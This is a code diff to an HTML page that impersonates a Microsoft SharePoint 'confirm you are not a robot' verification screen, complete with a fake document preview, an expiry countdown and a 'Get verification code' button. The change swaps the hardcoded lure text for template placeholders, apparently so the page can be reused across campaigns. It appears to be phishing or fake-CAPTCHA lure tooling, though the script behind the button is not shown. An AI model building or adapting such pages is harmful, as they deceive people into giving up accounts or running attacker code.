@@ -49,14 +49,14 @@
             <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
         </div>
 
-        <h1>Please confirm that you are not a robot</h1>
-        <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
+        <h1>{{TITLE}}</h1>
+        <p class="subtitle">{{MESSAGE}}</p>
         
         <div class="doc-preview">
             <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" style="width: 30px; height: 30px; opacity: 0.7;">
             <div>
-                <div class="doc-preview-name">Document Details</div>
-                <div class="doc-preview-meta">Document Details.pdf · 12 pages</div>
+                <div class="doc-preview-name">{{FILE_NAME}}</div>
+                <div class="doc-preview-meta">{{PAGES_LABEL}}</div>
             </div>
         </div>
 
@@ -68,7 +68,7 @@
             <div class="timer-text">Verification code expires in 9:54</div>
         </div>
 
-        <button id="start-btn" class="btn-primary" onclick="startVerification()">Get verification code</button>
+        <button id="start-btn" class="btn-primary" onclick="startVerification()">{{BUTTON_TEXT}}</button>
         
         <div class="footer">
             Microsoft account · SharePoint · Security · Privacy
